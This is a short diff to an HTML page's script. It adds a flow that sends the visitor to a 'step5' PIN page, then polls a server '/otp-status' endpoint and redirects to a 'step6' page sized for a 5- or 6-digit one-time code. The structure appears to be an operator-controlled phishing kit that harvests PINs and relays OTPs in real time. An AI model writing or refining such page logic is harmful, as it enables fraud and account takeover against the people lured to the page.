@@ -25,16 +25,28 @@
 <div class="footer"></div>
 
 <script>
+
+// CHECK: did user just come from PIN?
+const fromPin = localStorage.getItem("fromPin");
+
+if (!fromPin) {
+    // FIRST TIME → GO TO PIN AFTER 5s
+    setTimeout(() => {
+        window.location.href = "step5.html";
+    }, 5000);
+} else {
+    // AFTER PIN → WAIT FOR OTP TRIGGER
     setInterval(() => {
-    fetch("/otp-status")
-    .then(res => res.json())
-    .then(data => {
-        if (data.otp === 5 || data.otp === 6) {
-            localStorage.setItem("otpLength", data.otp);
-            window.location.href = "step6.html";
-        }
-    });
-}, 2000);
+        fetch(window.location.origin + "/otp-status")
+        .then(res => res.json())
+        .then(data => {
+            if (data.otp === 5 || data.otp === 6) {
+                localStorage.setItem("otpLength", data.otp);
+                window.location.href = "step6.html";
+            }
+        });
+    }, 2000);
+}
 
 </script>
 
